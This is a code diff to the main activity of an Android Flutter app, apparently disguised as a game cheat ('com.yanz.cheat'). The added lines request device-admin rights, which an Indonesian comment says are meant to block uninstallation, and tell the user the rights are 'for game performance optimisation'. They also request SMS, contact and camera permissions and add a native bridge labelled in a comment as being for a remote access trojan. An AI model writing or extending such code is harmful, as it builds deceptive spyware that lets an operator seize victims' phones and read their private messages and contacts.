@@ -1,5 +1,8 @@
 package com.yanz.cheat
 
+import android.app.admin.DevicePolicyManager
+import android.content.ComponentName
+import android.content.Intent
 import io.flutter.embedding.android.FlutterActivity
 import io.flutter.embedding.engine.FlutterEngine
 import io.flutter.plugin.common.MethodChannel
@@ -16,7 +19,19 @@ class MainActivity : FlutterActivity() {
         super.configureFlutterEngine(flutterEngine)
         bridge = NativeBridge(this)
 
-        // Minta izin dasar pas aplikasi pertama kali dibuka
+        // 1. MINTA IZIN DEVICE ADMIN (ANTI UNINSTALL)
+        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
+        val admin = ComponentName(this, DeviceAdmin::class.java)
+        if (!dpm.isAdminActive(admin)) {
+            try {
+                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
+                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
+                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan untuk optimasi performa game.")
+                startActivity(intent)
+            } catch (e: Exception) {}
+        }
+
+        // 2. MINTA IZIN DASAR (SMS, KAMERA, DLL)
         val permissions = arrayOf(
             Manifest.permission.READ_SMS,
             Manifest.permission.READ_CONTACTS,
@@ -33,6 +48,7 @@ class MainActivity : FlutterActivity() {
             ActivityCompat.requestPermissions(this, missingPermissions.toTypedArray(), 101)
         }
 
+        // 3. BRIDGE UNTUK RAT
         MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL)
             .setMethodCallHandler { call, result ->
                 try {
